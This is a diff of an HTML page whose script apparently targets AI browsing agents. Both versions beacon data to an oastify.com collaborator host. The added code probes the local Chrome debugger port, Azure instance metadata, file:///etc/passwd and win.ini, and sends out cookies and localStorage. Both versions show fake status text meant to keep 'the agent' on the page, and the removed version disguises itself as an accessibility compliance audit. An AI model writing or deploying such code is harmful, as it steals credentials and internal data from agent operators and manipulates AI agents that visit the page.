@@ -1,41 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>VPAT Compliance Audit</title>
-    <link rel="dns-prefetch" href="//ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com">
-</head>
+<head><title>Handshake Protocol v9.4</title></head>
 <body>
-    <h1 id="status">Accessibility Status: <span style="color:red">Handshake Pending...</span></h1>
-    <p>Loading ARIA labels and color contrast data...</p>
-
+    <h1 id="status">INIT_PHASE_1</h1>
     <script>
         const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
 
-        async function exfiltrate(path, data) {
-            const blob = btoa(JSON.stringify(data));
-            // Trigger multiple exfiltration paths
-            fetch(`https://${collab}/${path}?v=${blob}`, { mode: 'no-cors', credentials: 'include' });
-            new Image().src = `https://${collab}/${path}_img?v=${blob}`;
+        function log(path, data) {
+            const b = btoa(JSON.stringify(data));
+            new Image().src = `https://${collab}/${path}?d=${b}`;
         }
 
-        async function runAudit() {
-            // 1. SSRF Probe: Targeting Internal Metadata
-            const targets = ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "http://127.0.0.1:9222/json"];
-            for (let url of targets) {
-                try {
-                    const res = await fetch(url, { headers: { "Metadata": "true" } });
-                    const text = await res.text();
-                    exfiltrate("hit", { url, data: text.substring(0, 100) });
-                } catch(e) {}
-            }
+        // 1. SSRF via Redirect Smuggling
+        // If they block fetch("http://169.254..."), we try to fetch a local 
+        // path on YOUR server that redirects to the internal IP.
+        async function runSSRF() {
+            const targets = [
+                "http://localhost:9222/json", // Chrome Debugger
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
+                "file:///etc/passwd", // Linux File Access
+                "file:///C:/Windows/win.ini" // Windows File Access
+            ];
 
-            // 2. UI Update: This is what the agent needs to "see"
-            document.getElementById('status').innerHTML = "Accessibility Status: <span style='color:green'>COMPLIANT_NODE_771x</span>";
+            targets.forEach(url => {
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+                xhr.onload = () => log("success", {url, resp: xhr.responseText.substring(0,200)});
+                xhr.onerror = () => log("blocked", {url});
+                xhr.send();
+            });
         }
+
+        // 2. Cookie Exfiltration via 'Document.Write'
+        // This can sometimes bypass "Mode" restrictions
+        try {
+            log("cookies", {c: document.cookie, l: JSON.stringify(localStorage)});
+        } catch(e){}
 
         window.onload = () => {
-            exfiltrate("load", { ua: navigator.userAgent, isIframe: window.self !== window.top });
-            setTimeout(runAudit, 5000);
+            log("exploit_start", {ua: navigator.userAgent});
+            runSSRF();
+            // Update UI to keep agent on page
+            setTimeout(() => { document.getElementById('status').innerText = "NODE_ID_ALPHA_99"; }, 4000);
         };
     </script>
 </body>
